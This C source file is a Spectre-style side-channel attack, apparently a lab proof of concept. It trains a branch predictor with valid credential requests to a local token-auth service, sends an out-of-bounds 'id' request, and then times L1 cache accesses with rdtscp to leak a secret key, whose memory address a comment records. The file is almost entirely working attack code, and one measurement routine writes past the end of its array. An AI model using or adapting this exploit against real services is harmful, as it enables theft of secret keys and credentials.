#include <stdio.h>
#include <stdint.h>

#include <x86intrin.h>
#include <curl/curl.h>

#include "attacker.h"

#define WAYS 8
#define SETS 64
#define LINE_SIZE 64
#define L1_SIZE (WAYS * SETS * LINE_SIZE)
#define NO_LINES (WAYS * SETS)

#define INDEXES_PER_LINE (LINE_SIZE / sizeof(int))
#define TRAINING_REPS 100
#define PROBE_ARR_SIZE (L1_SIZE/sizeof(int))
// ADDRESS SECRET_KEY[0] -> 0x555555556008
// avg cache fetch time = 30 cycles

int probe_array[PROBE_ARR_SIZE]; // allocates int array of size = L1_SIZE
int main() {
    int count[SETS] = {0};
    curl_global_init(CURL_GLOBAL_ALL);
    int loops = 100;
    while (loops > 0){
        // Train BP
        for(int i = 0; i < TRAINING_REPS; i++){
                valid_request(); // send valid credentials
            }
        
        // Prime L1 cache
        // just need to hit each cache line once (so will skip indexes on the same line)
        for (int j = 0; j < 5; j++){
            // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
            for (unsigned int i = 0; i < PROBE_ARR_SIZE; i+=INDEXES_PER_LINE){
                probe_array[i] = 0; 
            }
        }
        
        _mm_mfence(); // wait for prime to compelte before sending bad request
        // cache check 
        bad_request();
        _mm_mfence();

        check_cache_presence(count);
        loops --;
    }
    for (int i = 0; i < SETS; i ++){
        if (count[i] > 0){
            printf("Set %d: %d\n", i, count[i]);
        }
    }
    return 0;
}


// send valid credentials with curl request for token to microservice
void valid_request(){

    CURL *curl_handle;
    //CURLcode res;

    curl_handle = curl_easy_init();
    if (curl_handle){
        char *data = "username=user1&password=password&id=2";

        curl_easy_setopt(curl_handle, CURLOPT_URL, "http://127.0.0.1:8080/token-auth/");
        curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);

        curl_easy_perform(curl_handle);
    }

}

void bad_request(){
        CURL *curl_handle;
    //CURLcode res;

    curl_handle = curl_easy_init();
    if (curl_handle){
        char *data = "username=user1&password=password&id=800";

        curl_easy_setopt(curl_handle, CURLOPT_URL, "http://127.0.0.1:8080/token-auth/");
        curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);

        curl_easy_perform(curl_handle);
    }
}

void check_cache_presence(int *count){
    int present = 0;
    uint64_t t1, t2;
    unsigned int pid;
    for (unsigned int i = 0; i < PROBE_ARR_SIZE; i+=INDEXES_PER_LINE){
            _mm_lfence();
            t1 = __rdtscp(&pid);
            _mm_lfence();

            probe_array[i] = 0;

            _mm_lfence();
            t2 = __rdtscp(&pid);
            _mm_lfence();
            
            if (t2 - t1 < 100){
                present ++;
                
            }
            else{
                int set_index = (i / INDEXES_PER_LINE) % SETS;
                count[set_index]++;
            }
        }
    
    printf("%d/%d cache hits\n", present, NO_LINES);
}

void cache_Measurement(){
    int total = 0;
    int tot_presen = 0;
    int j = 0;
    while (j < 1000){
        // PRIME PHASE
        int present = 0;
        uint64_t t1, t2;
        unsigned int pid;
        for (int j = 0; j < 1000; j++){
            for (int i = 0; i < L1_SIZE; i++){
                probe_array[i] = 0;
            }
        }
        printf("Checking Cache Presence...\n");
        
        for (int i = 0; i < L1_SIZE; i++){
            t1 = __rdtscp(&pid);
            probe_array[i] = 0;
            t2 = __rdtscp(&pid);
            if (t2 - t1 < 50){
                total += t2-t1;
                tot_presen ++;
                present ++;
            }
        }

        printf("%d/%d cache hits\n", present, L1_SIZE);
        j++;
        // PROBE PHASE
    }
    printf("avg cache fetch time: %d", total/tot_presen);
}



